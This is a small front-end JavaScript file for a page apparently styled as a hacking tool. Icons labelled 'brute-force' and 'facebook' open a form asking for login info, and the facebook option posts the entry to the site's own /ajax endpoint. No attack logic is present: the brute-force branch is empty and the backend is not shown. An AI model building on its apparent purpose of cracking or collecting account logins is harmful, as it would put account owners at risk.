"use strict"
import { Request } from "./xhr.js";
import {Selector}  from "./xhr.js";





const sound = document.getElementById('audio');
var form = Selector("#form");

/* FUNCTIONS APP ICONS CLICK*/
Selector("#brute-force").onclick=()=>{
  form.style.display = "block";
  Selector("#hidden-data").value="brute-force";
}
Selector("#facebook").onclick=()=>{
  form.style.display = "block";
  Selector("#hidden-data").value="facebook";
}
Selector("#cross").onclick=()=>{
  form.style.display = "none";
}



/*   SEND DATA    */
Selector("#btn").onclick=(e)=>{
 e.preventDefault();
var hiddenData = Selector("#hidden-data").value;
 var input = Selector("#idName").value;
if( input == ""){
  alert("Please Enter Login Info");
} else {
  switch (hiddenData) {
    case 'brute-force':
      //call brute-force 
      break;
    case 'facebook':
      // call Facebook 
    fetch("/ajax", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ data: input })
            })
            .then((response) =>{
            return response.text()
            })
            .then((data) => {
                alert(data)
            })
            .catch((error) => {
                alert(error)
            });
    default:
      // code
  }
}
}


setTimeout(()=> {
  Selector(".preloader").style.display="none";
  Selector("#table").style.display="block";
}, 13000);

window.onload=()=>{
sound.play();
}


